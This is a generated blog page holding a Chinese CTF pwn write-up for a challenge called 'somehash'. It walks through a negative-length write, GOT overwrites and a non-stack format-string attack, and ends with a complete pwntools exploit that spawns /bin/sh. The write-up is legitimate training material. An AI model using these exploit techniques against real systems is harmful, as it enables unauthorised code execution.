@@ -1,0 +1,672 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>Hello(*^▽^*)</title>
+    <meta name="author" content="0xt5" />
+    <meta name="description" content="一个基于 Hexo 和 GitHub Pages 的个人博客" />
+    <meta name="keywords" content="Hexo,GitHub Pages,Blog" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/custom-particlex-avatar.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=20260526-links-fix" />
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+    
+    <script>
+        (() => {
+            const storageKey = "particlex-color-theme";
+            const root = document.documentElement;
+            const getPreferredTheme = () => {
+                const saved = localStorage.getItem(storageKey);
+                if (saved === "light" || saved === "dark") return saved;
+                return window.matchMedia &&
+                    window.matchMedia("(prefers-color-scheme: dark)").matches
+                    ? "dark"
+                    : "light";
+            };
+            root.setAttribute("data-theme", getPreferredTheme());
+        })();
+    </script>
+    <div
+        id="tab-title-config"
+        data-enable="1"
+        data-active-title="Hello(*^▽^*)"
+        data-active-delay="2600"
+        data-default-title="somehash | 0xt5 Blog"
+        data-inactive-title="∑(っ°Д°;)っ诶卧槽，不见了"
+        data-inactive-scroll-speed="180"
+        hidden
+    ></div>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>如果加载较慢，请稍后刷新页面。</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>0XT5 BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;首页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;碎碎念</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;归档</span>
+        </a>
+        
+        <a href="/comment">
+            <i class="fa-solid fa-comment fa-fw"></i>
+            <span>&ensp;留言板</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <a href="/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;友情链接</span>
+        </a>
+        
+        <a href="/game/">
+            <i class="fa-solid fa-face-laugh-squint fa-fw"></i>
+            <span>&ensp;game！</span>
+        </a>
+        
+        <button
+            id="theme-toggle"
+            class="theme-toggle"
+            type="button"
+            :aria-label="isDarkTheme ? '切换为亮色模式' : '切换为暗色模式'"
+            :title="isDarkTheme ? '切换为亮色模式' : '切换为暗色模式'"
+            :data-mode="isDarkTheme ? 'dark' : 'light'"
+            @click="toggleColorTheme"
+        >
+            <span class="theme-toggle-track">
+                <span class="theme-toggle-thumb">
+                    <i class="fa-solid fa-sun theme-icon theme-icon-sun"></i>
+                    <i class="fa-solid fa-moon theme-icon theme-icon-moon"></i>
+                </span>
+            </span>
+        </button>
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;0XT5 BLOG</span>
+        </div>
+        <button
+            id="theme-toggle-mobile"
+            class="theme-toggle theme-toggle-mobile"
+            type="button"
+            :aria-label="isDarkTheme ? '切换为亮色模式' : '切换为暗色模式'"
+            :title="isDarkTheme ? '切换为亮色模式' : '切换为暗色模式'"
+            :data-mode="isDarkTheme ? 'dark' : 'light'"
+            @click.stop="toggleColorTheme"
+        >
+            <span class="theme-toggle-track">
+                <span class="theme-toggle-thumb">
+                    <i class="fa-solid fa-sun theme-icon theme-icon-sun"></i>
+                    <i class="fa-solid fa-moon theme-icon theme-icon-moon"></i>
+                </span>
+            </span>
+        </button>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">首页</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">碎碎念</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">归档</div>
+                    </div>
+                </a>
+                
+                <a href="/comment">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-comment fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">留言板</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+                <a href="/links">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-link fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">友情链接</div>
+                    </div>
+                </a>
+                
+                <a href="/game/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-face-laugh-squint fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">game！</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>somehash</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/6/20
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
+                    Pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" data-tag-name="非栈上格式化字符串" data-tag-color-role="text">
+                    非栈上格式化字符串
+                </a>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
+                    栈
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>拖拖拖拖拖拖拉拉拉拉拉拉的终于结束了somehash这个题</p>
+<p>接下来是临近期末的大速通时代！o(╥﹏╥)o</p>
+<p>如果需要原文件可以给我留言或者直接加我QQ</p>
+<p>或者在QQ邮箱联系：<a href="mailto:&#x33;&#x32;&#x32;&#x39;&#51;&#55;&#51;&#57;&#x38;&#50;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">3229373982@qq.com</a><br>看到肯定会回的</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>拿到题目之后 先放入ida 然后checksec</p>
+<p>保护全开</p>
+<p><img src="/images/somehash/image-20260610101435489.png" alt="image-20260610101435489"></p>
+<p>然后ida，分析</p>
+<p>发现这里对输入的 name length没有进行负数的判断<img src="/images/somehash/image-20260610101616257.png" alt="image-20260610101616257"></p>
+<p>所以输入name的时候，输入负数的话 会向低地址进行复写</p>
+<p><img src="/images/somehash/image-20260610103551571.png" alt="image-20260610103551571"></p>
+<p>p_buf      &#x3D; 0x50c0<br>strlen@got &#x3D; 0x5028</p>
+<p><img src="/images/somehash/image-20260610112807741.png" alt="image-20260610112807741"></p>
+<p><img src="/images/somehash/image-20260610112819802.png" alt="image-20260610112819802"></p>
+<p>我们可以通过输入负数，然后通过p_buf <strong>对strlen@got进行修改（这里还未对strlen进行调用）</strong> 修改为printf函数 然后在后续的函数调用的时候方便泄露地址</p>
+<p>这里通过计算可得p_buf和stlen@got 中间的距离是 152 所以我们填的时候就可以直接输入-152 然后就可以通过</p>
+<pre><code class="language-c">printf(&quot;name&gt; &quot;);
+p_buf[n256] = read(0, p_buf, (unsigned __int16)n256);
+</code></pre>
+<p>这里修改 stlen的地址了</p>
+<p><img src="/images/somehash/image-20260612192920014.png" alt="image-20260612192920014"></p>
+<h2 id="修改地址"><a href="#修改地址" class="headerlink" title="修改地址"></a>修改地址</h2><p>这里程序需要根据got表里面储存的偏移地址 进行调用然后跳转</p>
+<p>🤔🤔🤔 可以根据这个来利用一下🤔🤔🤔</p>
+<p>现在还未对于strlen进行调用 如果我们把strlen里面的0x1050修改成0x1080 那岂不是之后调用strlen函数的时候实际上调用的是printf函数 </p>
+<p>这样岂不美哉😋</p>
+<p>（这里的地址和下面的不同是正常的 因为我不小心重开了gdb）</p>
+<p><img src="/images/somehash/image-20260612193733211.png" alt="image-20260612193733211"></p>
+<p>所以第一段payload要发送0x80个字节 从而把0x1050修改为0x1080</p>
+<p>那由于程序开启了PIE还有Canary 所以要泄露基址还有能用的指针链</p>
+<p>下面的这个是还未对strlen进行调用 printf已经调用</p>
+<p><img src="/images/somehash/image-20260614104237928.png" alt="image-20260614104237928"></p>
+<p>下面的是对于strlen已经进行修改还未进行调用的地址</p>
+<p><img src="/images/somehash/image-20260614104409155.png" alt="image-20260614104409155"></p>
+<p>可以看到后面已经从50变为了80</p>
+<p>strlen@got 改前：base + 0x1050</p>
+<p>strlen@got 改后：base + 0x1080</p>
+<p>vmmap图 </p>
+<p><img src="/images/somehash/image-20260614104430491.png" alt="image-20260614104430491"></p>
+<p>这里对strlen修改成功了 然后之后可以利用格式化字符串进行泄露地址了</p>
+<p>这里我们成功泄露栈上的地址</p>
+<p>选择的是19 23 28 45这四个位置</p>
+<p><img src="/images/somehash/image-20260614104623734.png" alt="image-20260614104623734"></p>
+<p><img src="/images/somehash/image-20260614104902729.png" alt="image-20260614104902729"></p>
+<p>exp</p>
+<pre><code class="language-py">io.recvuntil(b&quot;name length&gt; &quot;)
+io.send(b&quot;-152&quot;)
+io.recvuntil(b&quot;name&gt; &quot;)
+
+name_payload = b&quot;QQ%19$p.%23$p.%28$p.%45$pRR&quot;.ljust(0x80, b&quot;A&quot;)
+io.send(name_payload)
+</code></pre>
+<p>这里选择的依据是和vmmap图里面程序和libc的起始地址和终止地址进行选择的 还有根据栈上可以用的指针链进行选择的</p>
+<p>之后我们需要把%23指向的地址修改为我们需要的地址因为这样就可以更方便的修改地址</p>
+<p>也就是</p>
+<pre><code class="language-pyt">width = (slot28 &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%23$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+</code></pre>
+<p><img src="/images/somehash/image-20260620155316258.png" alt="image-20260620155316258"></p>
+<p>对比图</p>
+<p><img src="/images/somehash/image-20260620155127689.png" alt="image-20260620155127689"></p>
+<p><img src="/images/somehash/image-20260620155236396.png" alt="image-20260620155236396"></p>
+<p>接下来要修改循环的次数从而方便我们进行多次调用</p>
+<pre><code class="language-py"># 把 28 号参数改到 trials
+width = ((base + trials_off) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+
+# trials = 0x20，这样后面有足够次数慢慢写 GOT
+width = 0x20
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;trials -&gt; 0x20&quot;)
+</code></pre>
+<p>trials &#x3D; base + 0x5078 &#x3D; 0x61441f769078</p>
+<blockquote>
+<p>.data:0000000000005078 dword_5078      dd 3                    ; DATA XREF: main+1CE↑r<br>.data:0000000000005078                                         ; main:loc_288F↑r …<br>.data:0000000000005078 _data           ends<br>.data:0000000000005078<br>LOAD:000000000000507C ; </p>
+</blockquote>
+<p>修改之前的次数</p>
+<p><img src="/images/somehash/image-20260620161911174.png" alt="image-20260620161911174"></p>
+<p>把 28 号参数改到 trials</p>
+<p><img src="/images/somehash/image-20260620161826847.png" alt="image-20260620161826847"></p>
+<p>trials &#x3D; 0x20，这样后面有足够次数慢慢写 GOT</p>
+<p><img src="/images/somehash/image-20260620162648866.png" alt="image-20260620162648866"></p>
+<p>对比图（把 28 号参数改到 trials）</p>
+<p><img src="/images/somehash/image-20260620162003937.png" alt="image-20260620162003937"></p>
+<p><img src="/images/somehash/image-20260620162330823.png" alt="image-20260620162330823"></p>
+<p>对比图（把 28 号参数改到 trials）</p>
+<p><img src="/images/somehash/image-20260620162726949.png" alt="image-20260620162726949"></p>
+<p><img src="/images/somehash/image-20260620162802231.png" alt="image-20260620162802231"></p>
+<p>当然这里也可以直接 x&#x2F;wx 0x61441f769078</p>
+<p>输出的也是</p>
+<p><img src="/images/somehash/image-20260620162931410.png" alt="image-20260620162931410"></p>
+<p>修改strlen为system</p>
+<pre><code>set $atoi_got = $codebase + 0x5060
+set $strlen_got = $codebase + 0x5028
+set $helper = $codebase + 0x24cf
+set $trials = $codebase + 0x5078
+p/x $system
+</code></pre>
+<p>这里的codebase和system可以通过脚本泄露 后面的例如0x5028这些地址在ida里面都可以找到 可以去对应着理解一下</p>
+<pre><code class="language-py"># system 地址的低 3 字节
+system_byte0 = p64(system)[0]
+system_byte1 = p64(system)[1]
+system_byte2 = p64(system)[2]
+
+# atoi@got 第 0 个字节
+width = ((base + atoi_got) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+width = system_byte0 or 0x100
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;atoi[0] -&gt; %#x&quot; % system_byte0)
+
+# atoi@got 第 1 个字节
+width = ((base + atoi_got + 1) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+width = system_byte1 or 0x100
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;atoi[1] -&gt; %#x&quot; % system_byte1)
+
+# atoi@got 第 2 个字节
+width = ((base + atoi_got + 2) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+width = system_byte2 or 0x100
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;atoi[2] -&gt; %#x&quot; % system_byte2)
+</code></pre>
+<p>对比图</p>
+<p><img src="/images/somehash/image-20260620163820059.png" alt="image-20260620163820059"></p>
+<p><img src="/images/somehash/image-20260620164143816.png" alt="image-20260620164143816"></p>
+<p><img src="/images/somehash/image-20260620164249900.png" alt="image-20260620164249900"></p>
+<p>后面两张图片说明已经在改atoi_got了</p>
+<p>然后再更改atoi_got的下一个字节</p>
+<p>对比图</p>
+<p><img src="/images/somehash/image-20260620164744726.png" alt="image-20260620164744726"></p>
+<p><img src="/images/somehash/image-20260620164851456.png" alt="image-20260620164851456"></p>
+<p><img src="/images/somehash/image-20260620164948860.png" alt="image-20260620164948860"></p>
+<p><img src="/images/somehash/image-20260620165028622.png" alt="image-20260620165028622"></p>
+<p>接下来按同样节奏走修改</p>
+<p><img src="/images/somehash/image-20260620165252405.png" alt="image-20260620165252405"></p>
+<p><img src="/images/somehash/image-20260620165329506.png" alt="image-20260620165329506"></p>
+<p><img src="/images/somehash/image-20260620165407762.png" alt="image-20260620165407762"></p>
+<p><img src="/images/somehash/image-20260620165510049.png" alt="image-20260620165510049"></p>
+<p>这时 atoi@got 低 3 字节已经改成 system 低 3 字节了。</p>
+<p>把 slot28 改成 strlen@got</p>
+<pre><code class="language-py"># 再把 strlen@got 改到 0x24cf，那边会 read(0x10) 然后调 atoi
+width = ((base + strlen_got) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+</code></pre>
+<p>对比图</p>
+<p><img src="/images/somehash/image-20260620165817001.png" alt="image-20260620165817001"></p>
+<p><img src="/images/somehash/image-20260620165912011.png" alt="image-20260620165912011"></p>
+<p>把 strlen@got 改到 helper</p>
+<pre><code class="language-py">width = ((base + helper_off) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%28$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;strlen@got -&gt; %#x&quot; % (base + helper_off))
+</code></pre>
+<p>对比图</p>
+<p><img src="/images/somehash/image-20260620170142413.png" alt="image-20260620170142413"></p>
+<p><img src="/images/somehash/image-20260620170338410.png" alt="image-20260620170338410"></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><img src="/images/somehash/image-20260620170527005.png" alt="image-20260620170527005"></p>
+<p><img src="/images/somehash/image-20260620170618272.png" alt="image-20260620170618272"></p>
+<p>完整exp</p>
+<pre><code class="language-py">from pwn import *
+
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+context.arch = &quot;amd64&quot;
+context.log_level = &quot;info&quot;
+
+elf = ELF(&quot;./somehash&quot;)
+libc = ELF(&quot;./wtf_somehash.6&quot;, checksec=False)
+
+env = {b&quot;LD_PRELOAD&quot;: b&quot;./wtf_somehash.6&quot;}
+
+strlen_got = elf.got[&quot;strlen&quot;]
+atoi_got = elf.got[&quot;atoi&quot;]
+trials_off = 0x5078
+helper_off = 0x24CF
+libc_leak_off = 0x29D90
+
+io = process(&quot;./somehash&quot;, env=env)
+# io = remote(&quot;39.96.193.120&quot;, 10002)
+
+io.recvuntil(b&quot;name length&gt; &quot;)
+io.send(b&quot;-152&quot;)
+io.recvuntil(b&quot;name&gt; &quot;)
+
+# 先把 strlen@got 的低字节改成 printf@plt，然后在这里直接泄漏地址
+
+name_payload = b&quot;QQ%19$p.%23$p.%28$p.%45$pRR&quot;.ljust(0x80, b&quot;A&quot;)
+io.send(name_payload)
+
+out = io.recvuntil(b&quot;content&gt; &quot;).decode(&quot;latin-1&quot;, &quot;ignore&quot;)
+leak_text = out.split(&quot;QQ&quot;, 1)[1].split(&quot;RR&quot;, 1)[0]
+leak19, s23, p28, code = [int(x, 16) for x in leak_text.split(&quot;.&quot;)]
+base = code - 0x1180
+libc_base = leak19 - libc_leak_off
+system = libc_base + libc.sym[&quot;system&quot;]
+slot28 = s23 - 0xC8
+
+log.success(&quot;base =====&gt; %#x&quot; % base)
+log.success(&quot;libc =====&gt; %#x&quot; % libc_base)
+log.success(&quot;system =====&gt; %#x&quot; % system)
+log.success(&quot;slot28 =====&gt; %#x&quot; % slot28)
+log.success(&quot;arg28 =====&gt; %#x&quot; % p28)
+
+gdb.attach(io)
+
+width = (slot28 &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%23$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+
+# 把 28 号参数改到 trials
+width = ((base + trials_off) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+
+# trials = 0x20，这样后面有足够次数慢慢写 GOT
+width = 0x20
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;trials -&gt; 0x20&quot;)
+
+# system 地址的低 3 字节
+system_byte0 = p64(system)[0]
+system_byte1 = p64(system)[1]
+system_byte2 = p64(system)[2]
+
+# atoi@got 第 0 个字节
+width = ((base + atoi_got) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+width = system_byte0 or 0x100
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;atoi[0] -&gt; %#x&quot; % system_byte0)
+
+# atoi@got 第 1 个字节
+width = ((base + atoi_got + 1) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+width = system_byte1 or 0x100
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;atoi[1] -&gt; %#x&quot; % system_byte1)
+
+# atoi@got 第 2 个字节
+width = ((base + atoi_got + 2) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+width = system_byte2 or 0x100
+io.sendline(f&quot;%19${width}c%28$hhn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;atoi[2] -&gt; %#x&quot; % system_byte2)
+
+# 再把 strlen@got 改到 0x24cf，那边会 read(0x10) 然后调 atoi
+width = ((base + strlen_got) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%53$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+
+width = ((base + helper_off) &amp; 0xFFFF) or 0x10000
+io.sendline(f&quot;%19${width}c%28$hn&quot;.encode())
+io.recvuntil(b&quot;content&gt; &quot;)
+log.success(&quot;strlen@got -&gt; %#x&quot; % (base + helper_off))
+
+io.sendline(b&quot;TRIG&quot;)
+io.recvline(timeout=2)
+
+# 这里触发到 system(&quot;exec /bin/sh&quot;)
+io.send(b&quot;exec /bin/sh\n&quot;)
+sleep(0.3)
+io.interactive()
+</code></pre>
+<p>somehash这道题是一个好题我觉着，因为从这个题里面收获了很多，包括对地址修改还有看地址的一些gdb调试方法，听师傅说这道题有很多方法，包括&#x3D;&#x3D;ogg&#x3D;&#x3D;，&#x3D;&#x3D;rop&#x3D;&#x3D;，还有本题用到的&#x3D;&#x3D;修改strlen为system&#x3D;&#x3D;，剩下的方法我准备等有时间再尝试 再做一遍。</p>
+<p>这个exp用的指针链可以更换成别的地址的指针链，我的意思是说&#x3D;&#x3D;不止局限与当前exp上的指针链&#x3D;&#x3D;，我看stack上还有其他可以利用的指针链</p>
+<p>各位师傅可能看这个题很简单，但是对那时候的我来说有点难度，但是收获好多。</p>
+<p>最近马上要期末了，准备速通一下，希望不会挂科</p>
+<p>感想：真的收获了好多好多，对我个人的做题思路也有帮助。</p>
+
+    </div>
+    
+    
+    
+    
+    
+    <div id="comment">
+        <div id="utterances-container"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2026 - 2026 0xt5 Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;0xt5
+        </div>
+        <div>
+            基于 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 驱动，使用
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a> 主题
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/particlex-main.js"></script>
+    
+    
+
+<script>
+    (() => {
+        const container = document.getElementById("utterances-container");
+        if (!container || container.children.length) return;
+        const getUtterancesTheme = () =>
+            document.documentElement.getAttribute("data-theme") === "dark"
+                ? "github-dark"
+                : "github-light";
+        const script = document.createElement("script");
+        script.src = "https://utteranc.es/client.js";
+        script.setAttribute("repo", "0xt5/0xt5.github.io");
+        script.setAttribute("issue-term", "pathname");
+        
+        script.setAttribute("theme", getUtterancesTheme());
+        script.setAttribute("crossorigin", "anonymous");
+        script.async = true;
+        container.appendChild(script);
+
+        window.__particlexCommentThemeSync = () => {
+            const iframe = container.querySelector(".utterances-frame");
+            iframe?.contentWindow?.postMessage(
+                {
+                    type: "set-theme",
+                    theme: getUtterancesTheme(),
+                },
+                "https://utteranc.es"
+            );
+        };
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
